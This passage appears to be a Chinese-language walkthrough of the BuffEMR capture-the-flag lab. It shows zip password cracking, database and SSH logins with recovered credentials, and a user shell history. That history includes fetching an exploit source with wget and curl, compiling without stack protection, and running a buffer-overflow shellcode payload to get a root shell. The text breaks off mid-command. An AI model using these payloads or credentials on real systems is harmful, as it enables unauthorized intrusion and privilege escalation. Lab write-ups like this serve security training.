<p><code>/var</code> 下找到个 user.zip ，有读权限，不过解压需要密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221124737.jpg" /></p>
<p>蚁剑下载后传至 kali ，利用 fcrackzip 和 john 破解均未果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -D -p rockyou.txt -u user.zip</span><br><span class="line">zip2john user.zip &gt; user_pass</span><br><span class="line">john user_pass --wordlist=rockyou.txt </span><br></pre></td></tr></table></figure>
<p>利用 1.3 得到的数据库配置信息进数据库收集信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">www-data@buffemr:/var/www/html/openemr/interface/main/tabs$ mysql -uopenemruser -popenemruser123456</span><br><span class="line">&lt;/main/tabs$ mysql -uopenemruser -popenemruser123456        </span><br><span class="line">mysql: [Warning] Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 1670</span><br><span class="line">Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2023, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| openemr            |</span><br><span class="line">| user_info          |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use user_info;</span><br><span class="line">use user_info;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+---------------------+</span><br><span class="line">| Tables_in_user_info |</span><br><span class="line">+---------------------+</span><br><span class="line">| ENCKEYS             |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from ENCKEYS;</span><br><span class="line"><span class="keyword">select</span> * from ENCKEYS;</span><br><span class="line">+------+--------+----------------------+</span><br><span class="line">| <span class="built_in">id</span>   | name   | ENC                  |</span><br><span class="line">+------+--------+----------------------+</span><br><span class="line">|    1 | pdfkey | c2FuM25jcnlwdDNkCg== |</span><br><span class="line">+------+--------+----------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
<p>找到个 ENCKEYS ：<code>c2FuM25jcnlwdDNkCg==</code>，应当是 user.zip
的压缩密码</p>
<p><strong>注</strong>，经测压缩密码就是
<code>c2FuM25jcnlwdDNkCg==</code> ，无需 base64 解码</p>
<p>解压缩包得 user.lst</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">This file contain senstive information, therefore, should be always encrypted at rest.</span><br><span class="line"></span><br><span class="line">buffemr - Iamgr00t</span><br><span class="line"></span><br><span class="line">****** Only I can SSH in ************</span><br></pre></td></tr></table></figure>
<p>SSH 登录 <code>buffemr:Iamgr00t</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># ssh buffemr@192.168.1.155         </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.155 (192.168.1.155)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:iDfhRLBM9zHfhxy00x35NITvqWsh8n69t73luoP/ESE.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.155<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">buffemr@192.168.1.155&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">buffemr@192.168.1.155<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-77-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">229 packages can be updated.</span></span><br><span class="line"><span class="string">147 updates are security updates.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">New release &#x27;</span>20.04.6 LTS<span class="string">&#x27; available.</span></span><br><span class="line"><span class="string">Run &#x27;</span>do-release-upgrade<span class="string">&#x27; to upgrade to it.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Your Hardware Enablement Stack (HWE) is supported until April 2023.</span></span><br><span class="line"><span class="string">Last login: Thu Jun 24 10:01:00 2021 from 10.0.0.154</span></span><br><span class="line"><span class="string">buffemr@buffemr:~$ id</span></span><br><span class="line"><span class="string">uid=1000(buffemr) gid=1000(buffemr) groups=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span></span><br><span class="line"><span class="string">buffemr@buffemr:~$ ls -al</span></span><br><span class="line"><span class="string">total 108</span></span><br><span class="line"><span class="string">drwx------ 16 buffemr buffemr 4096 Jun 24  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x  3 root    root    4096 Jun 18  2021 ..</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr 7075 Jun 24  2021 .bash_history</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr  220 Jun 18  2021 .bash_logout</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr 3771 Jun 18  2021 .bashrc</span></span><br><span class="line"><span class="string">drwx------ 13 buffemr buffemr 4096 Jun 21  2021 .cache</span></span><br><span class="line"><span class="string">drwx------ 11 buffemr buffemr 4096 Jun 18  2021 .config</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Desktop</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Documents</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 23  2021 Downloads</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr 8980 Jun 18  2021 examples.desktop</span></span><br><span class="line"><span class="string">drwx------  3 buffemr buffemr 4096 Jun 18  2021 .gnupg</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr 3542 Jun 24  2021 .ICEauthority</span></span><br><span class="line"><span class="string">drwx------  3 buffemr buffemr 4096 Jun 18  2021 .local</span></span><br><span class="line"><span class="string">drwx------  5 buffemr buffemr 4096 Jun 18  2021 .mozilla</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Music</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr   55 Jun 20  2021 .mysql_history</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Pictures</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr  807 Jun 18  2021 .profile</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Public</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 .ssh</span></span><br><span class="line"><span class="string">-rwx------  1 buffemr buffemr    0 Jun 18  2021 .sudo_as_admin_successful</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Templates</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root    root    1720 Jun 21  2021 user_flag.txt</span></span><br><span class="line"><span class="string">drwx------  2 buffemr buffemr 4096 Jun 18  2021 Videos</span></span><br><span class="line"><span class="string">buffemr@buffemr:~$ cat user_flag.txt </span></span><br><span class="line"><span class="string">    .-.    ))    wWw \\\  ///      wWw \\\    ///()_()                                                                 </span></span><br><span class="line"><span class="string">  c(O_O)c (o0)-. (O)_((O)(O))      (O)_((O)  (O))(O o)                                                                 </span></span><br><span class="line"><span class="string"> ,&#x27;</span>.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 </span><br><span class="line">/ /|_|_|\ \| .-<span class="string">&#x27;/ (   ||\\||      / (   ||\\//||  |(_))                                                                </span></span><br><span class="line"><span class="string">| \_____/ ||(  (  _)  || \ |     (  _)  || \/ ||  |  /                                                                 </span></span><br><span class="line"><span class="string">&#x27;</span>. `---<span class="string">&#x27; .` \)  \ \_  ||  ||      \ \_  ||    ||  )|\\                                                                 </span></span><br><span class="line"><span class="string">  `-...-&#x27;</span>   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                </span><br><span class="line"> wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     </span><br><span class="line"> (O)  (O) /  _)-&lt;  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-&lt;  (O)_/||_   </span><br><span class="line"> / )  ( \ \__ `.   / __)|^_\      ,<span class="string">&#x27;.--.) ,&#x27;</span>.---.`, | \  / |  | (_))|^_\  ,<span class="string">&#x27;.---.`, | \  / |  (..) \__ `.   / __)/o_)  </span></span><br><span class="line"><span class="string">/ /    \ \   `. | / (   |(_))    / //_|_\/ /|_|_|\ \||\\//||  | .-&#x27;</span> |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  </span><br><span class="line">| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) </span><br><span class="line"><span class="string">&#x27;. `--&#x27;</span> .`,-<span class="string">&#x27;   | \ \_  )|\\     &#x27;</span>.    ) <span class="string">&#x27;. `---&#x27;</span> .`||    ||   \)   )|\\ <span class="string">&#x27;. `---&#x27;</span> .`||    || (_/\_),-<span class="string">&#x27;   | \ \_ | |//  </span></span><br><span class="line"><span class="string">  `-..-&#x27;</span> (_..--<span class="string">&#x27;   \__)(/  \)      `-.&#x27;</span>    `-...-<span class="string">&#x27; (_/    \_)  (   (/  \)  `-...-&#x27;</span> (_/    \_)     (_..--<span class="string">&#x27;   \__)\__/   </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">COnGRATS !! lETs get ROOT now ....!!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>获得 user_flag.txt</p>
<h3 id="提权至-root">2.3. 提权至 root</h3>
<p>前面可以看到 buffemr 用户的 .bash_history 未清理，读取看看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">buffemr@buffemr:~$ <span class="built_in">cat</span> .bash_history </span><br><span class="line">sudo su</span><br><span class="line">su root</span><br><span class="line">reboot</span><br><span class="line">mysql -u root -p</span><br><span class="line">mysql -uroot -p</span><br><span class="line">su root</span><br><span class="line">mysql -u openemruser</span><br><span class="line">mysql -u openemruser -p</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /home/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> /mnt/</span><br><span class="line">sudo -l</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">chmod</span> 700 -R /home/buffemr/</span><br><span class="line">sudo su</span><br><span class="line">su root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">curl https://www.danielmills.org/downloads/buffer_overflow/escalte.cpp -o nothing.cpp</span><br><span class="line">apt install curl</span><br><span class="line">sudo apt install curl</span><br><span class="line">wget https://www.danielmills.org/downloads/buffer_overflow/escalte.cpp</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">reboot</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;san3ncrypt3d&quot;</span> | <span class="built_in">base64</span> </span><br><span class="line">apt install g++</span><br><span class="line"><span class="built_in">cd</span> /mnt/</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> Downloads/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">mv</span> escalate.cpp /home/buffemr/</span><br><span class="line"><span class="built_in">cd</span> /home/buffemr/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">mv</span> escalate.cpp nothing.cpp</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">su root</span><br><span class="line">./dont_execute </span><br><span class="line">./dont_execute 12</span><br><span class="line">./dont_execute `python -c <span class="string">&#x27;print </span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string">./dont_execute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span>*200<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">sudo su</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">g++ nothing.cpp -o nothing -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">nano nothing.cpp </span></span><br><span class="line"><span class="string">g++ nothing.cpp -o nothing -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">cd /home/buffemr/</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cat user_flag.txt </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">./dont_execute 400</span></span><br><span class="line"><span class="string">./dont_execute 5000</span></span><br><span class="line"><span class="string">./dont_execute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span>*400<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dont_execute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span>*200<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dont_execute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span>*201<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dont_execute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span>*208<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">g++ dontexecute.cpp -o dontexecute -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">rm dontexecute.cpp </span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">find -name don*</span></span><br><span class="line"><span class="string">find -name *don*</span></span><br><span class="line"><span class="string">locate dont*</span></span><br><span class="line"><span class="string">locate *dont*</span></span><br><span class="line"><span class="string">locate *dont* /opt/</span></span><br><span class="line"><span class="string">clear </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cd Downloads/</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">mv escalate.cpp dontexecute.cpp</span></span><br><span class="line"><span class="string">mv dontexecute.cpp /opt/</span></span><br><span class="line"><span class="string">cd /opt/</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">nano dontexecute.cpp </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">rm dont_execute </span></span><br><span class="line"><span class="string">;s</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">g++ dontexecute.cpp -o dontexecute -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">g++ escalate.cpp -o escalate -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">g++ dontexecute.cpp -o dontexecute -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">nano dontexecute.cpp </span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">g++ dontexecute.cpp -o dontexecute -m32 -fno-stack-protector -z execstack</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">su root</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">gdb dontexecute </span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">./dontexecute $(python -c &quot;print &#x27;</span>\x90<span class="string">&#x27; * 457 + &#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27; + &#x27;</span>\xc0\xd5\xff\xff<span class="string">&#x27;&quot;)</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">sudo ./dontexecute $(python -c &quot;print &#x27;</span>\x90<span class="string">&#x27; * 457 + &#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27; + &#x27;</span>\xc0\xd5\xff\xff<span class="string">&#x27;&quot;)</span></span><br><span class="line"><span class="string">./dontexecute $(python -c &quot;print &#x27;</span>\x90<span class="string">&#x27; * 457 + &#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27; + &#x27;</span>\xc0\xd5\xff\xff<span class="string">&#x27;&quot;)</span></span><br><span class="line"><span class="string">cd /opt/</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">ls -la</span></span><br><span class="line"><span class="string">./dontexecute </span></span><br><span class="line"><span class="string">./dontexecute 1233</span></span><br><span class="line"><span class="string">strings dontexecute </span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 100<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 150<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 200<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 250<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 225<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 210<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 205<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 207<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 208<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb -q --args ./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 208<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb -q --args ./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 212<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb -q --args ./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 216<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb -q --args ./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 215<span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb -q --args ./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 215 + <span class="string">&quot;BCDE&quot;</span><span class="string">&#x27;`</span></span><br><span class="line"><span class="string">gdb -q --args ./dontexecute `python -c &#x27;</span><span class="built_in">print</span> <span class="string">&quot;A&quot;</span> * 212 + <span class="string">&quot;BCDE&quot;</span><span class="string">&#x27;`</span></span><br><span class="line"><span class="string">python -c &quot;print len(&#x27;</span>\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80<span class="string">&#x27;&quot;</span></span><br><span class="line"><span class="string">python -c &quot;print 